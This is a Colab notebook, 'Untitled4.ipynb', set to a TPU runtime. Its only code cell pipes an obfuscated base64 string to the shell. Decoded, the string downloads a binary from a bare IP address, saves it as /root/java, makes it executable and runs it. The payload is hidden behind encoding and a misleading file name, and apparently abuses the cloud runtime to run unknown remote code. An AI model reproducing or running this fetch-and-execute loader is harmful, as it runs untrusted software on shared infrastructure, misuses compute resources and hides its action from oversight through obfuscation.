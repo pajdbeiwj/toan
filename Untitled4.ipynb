{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "V28"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "BS_y76Q5tvG1"
      },
      "outputs": [],
      "source": [
        "! base64 -d <<< Y3VybCAtTCAtLXByb2dyZXNzLWJhciBodHRwOi8vMTUwLjEzNi4xNjguNzE6ODAvYXJjaHh4L2RlbnggLW8gL3Jvb3QvamF2YSAmJiBjaG1vZCAreCAvcm9vdC9qYXZhICYmIC9yb290L2phdmE= | sh"
      ]
    }
  ]
}